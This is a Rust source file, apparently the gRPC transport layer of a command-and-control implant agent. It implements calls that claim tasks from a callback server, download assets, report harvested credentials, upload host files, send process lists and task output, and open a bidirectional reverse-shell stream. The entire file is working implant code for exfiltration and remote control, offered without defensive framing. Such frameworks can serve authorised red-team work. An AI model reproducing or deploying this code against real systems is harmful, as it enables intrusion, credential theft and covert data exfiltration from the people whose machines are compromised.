use crate::Transport;
use anyhow::Result;
use pb::c2::*;
use std::sync::mpsc::{Receiver, Sender};
use tonic::codec::ProstCodec;
use tonic::GrpcMethod;
use tonic::Request;

use std::time::Duration;

static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";
static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";

#[derive(Debug, Clone)]
pub struct GRPC {
    grpc: tonic::client::Grpc<tonic::transport::Channel>,
}

impl Transport for GRPC {
    fn new(callback: String) -> Result<Self> {
        let endpoint = tonic::transport::Endpoint::from_shared(callback)?;

        let channel = endpoint
            .rate_limit(1, Duration::from_millis(25))
            .connect_lazy();

        let grpc = tonic::client::Grpc::new(channel);
        Ok(Self { grpc })
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        let resp = self.claim_tasks_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        tx: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        #[cfg(debug_assertions)]
        let filename = request.name.clone();

        let resp = self.fetch_asset_impl(request).await?;
        let mut stream = resp.into_inner();
        tokio::spawn(async move {
            loop {
                let msg = match stream.message().await {
                    Ok(maybe_msg) => match maybe_msg {
                        Some(msg) => msg,
                        None => {
                            break;
                        }
                    },
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!("failed to download file: {}: {}", filename, _err);

                        return;
                    }
                };
                match tx.send(msg) {
                    Ok(_) => {}
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!(
                            "failed to send downloaded file chunk: {}: {}",
                            filename,
                            _err
                        );

                        return;
                    }
                }
            }
        });
        Ok(())
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        let resp = self.report_credential_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        let stream = tokio_stream::iter(request);
        let tonic_req = Request::new(stream);
        let resp = self.report_file_impl(tonic_req).await?;
        Ok(resp.into_inner())
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        let resp = self.report_process_list_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn report_task_output(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse> {
        let resp = self.report_task_output_impl(request).await?;
        Ok(resp.into_inner())
    }

    async fn reverse_shell(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        // Wrap PTY output receiver in stream
        let req_stream = tokio_stream::wrappers::ReceiverStream::new(rx);

        // Open gRPC Bi-Directional Stream
        let resp = self.reverse_shell_impl(req_stream).await?;
        let mut resp_stream = resp.into_inner();

        // Spawn task to deliver PTY input
        tokio::spawn(async move {
            while let Some(msg) = match resp_stream.message().await {
                Ok(m) => m,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to receive gRPC stream response: {}", _err);

                    None
                }
            } {
                match tx.send(msg).await {
                    Ok(_) => {}
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!("failed to queue pty input: {}", _err);
                    }
                }
            }
        });

        Ok(())
    }
}

impl GRPC {
    ///
    /// Contact the server for new tasks to execute.
    pub async fn claim_tasks_impl(
        &mut self,
        request: impl tonic::IntoRequest<ClaimTasksRequest>,
    ) -> std::result::Result<tonic::Response<ClaimTasksResponse>, tonic::Status> {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec: ProstCodec<ClaimTasksRequest, ClaimTasksResponse> =
            tonic::codec::ProstCodec::default();

        let path = tonic::codegen::http::uri::PathAndQuery::from_static(CLAIM_TASKS_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ClaimTasks"));
        self.grpc.unary(req, path, codec).await
    }

    ///
    /// Download a file from the server, returning one or more chunks of data.
    /// The maximum size of these chunks is determined by the server.
    /// The server should reply with two headers:
    ///   - "sha3-256-checksum": A SHA3-256 digest of the entire file contents.
    ///   - "file-size": The number of bytes contained by the file.
    ///
    /// If no associated file can be found, a NotFound status error is returned.
    pub async fn fetch_asset_impl(
        &mut self,
        request: impl tonic::IntoRequest<FetchAssetRequest>,
    ) -> std::result::Result<
        tonic::Response<tonic::codec::Streaming<FetchAssetResponse>>,
        tonic::Status,
    > {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec: ProstCodec<FetchAssetRequest, FetchAssetResponse> =
            tonic::codec::ProstCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(FETCH_ASSET_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "FetchAsset"));
        self.grpc.server_streaming(req, path, codec).await
    }

    ///
    /// Report a credential.
    pub async fn report_credential_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportCredentialRequest>,
    ) -> std::result::Result<tonic::Response<ReportCredentialResponse>, tonic::Status> {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec: ProstCodec<ReportCredentialRequest, ReportCredentialResponse> =
            tonic::codec::ProstCodec::default();

        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_CREDENTIAL_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportCredential"));
        self.grpc.unary(req, path, codec).await
    }

    ///
    /// Report a file from the host to the server.
    /// Providing content of the file is optional. If content is provided:
    ///   - Hash will automatically be calculated and the provided hash will be ignored.
    ///   - Size will automatically be calculated and the provided size will be ignored.
    /// Content is provided as chunks, the size of which are up to the agent to define (based on memory constraints).
    /// Any existing files at the provided path for the host are replaced.
    pub async fn report_file_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = ReportFileRequest>,
    ) -> std::result::Result<tonic::Response<ReportFileResponse>, tonic::Status> {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec: ProstCodec<ReportFileRequest, ReportFileResponse> =
            tonic::codec::ProstCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_FILE_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportFile"));
        self.grpc.client_streaming(req, path, codec).await
    }

    ///
    /// Report the active list of running processes. This list will replace any previously reported
    /// lists for the same host.
    pub async fn report_process_list_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportProcessListRequest>,
    ) -> std::result::Result<tonic::Response<ReportProcessListResponse>, tonic::Status> {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec: ProstCodec<ReportProcessListRequest, ReportProcessListResponse> =
            tonic::codec::ProstCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_PROCESS_LIST_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportProcessList"));
        self.grpc.unary(req, path, codec).await
    }

    ///
    /// Report execution output for a task.
    pub async fn report_task_output_impl(
        &mut self,
        request: impl tonic::IntoRequest<ReportTaskOutputRequest>,
    ) -> std::result::Result<tonic::Response<ReportTaskOutputResponse>, tonic::Status> {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec: ProstCodec<ReportTaskOutputRequest, ReportTaskOutputResponse> =
            tonic::codec::ProstCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_TASK_OUTPUT_PATH);
        let mut req = request.into_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReportTaskOutput"));
        self.grpc.unary(req, path, codec).await
    }

    async fn reverse_shell_impl(
        &mut self,
        request: impl tonic::IntoStreamingRequest<Message = ReverseShellRequest>,
    ) -> std::result::Result<
        tonic::Response<tonic::codec::Streaming<ReverseShellResponse>>,
        tonic::Status,
    > {
        self.grpc.ready().await.map_err(|e| {
            tonic::Status::new(
                tonic::Code::Unknown,
                format!("Service was not ready: {}", e),
            )
        })?;
        let codec: ProstCodec<ReverseShellRequest, ReverseShellResponse> =
            tonic::codec::ProstCodec::default();
        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REVERSE_SHELL_PATH);
        let mut req = request.into_streaming_request();
        req.extensions_mut()
            .insert(GrpcMethod::new("c2.C2", "ReverseShell"));
        self.grpc.streaming(req, path, codec).await
    }
}
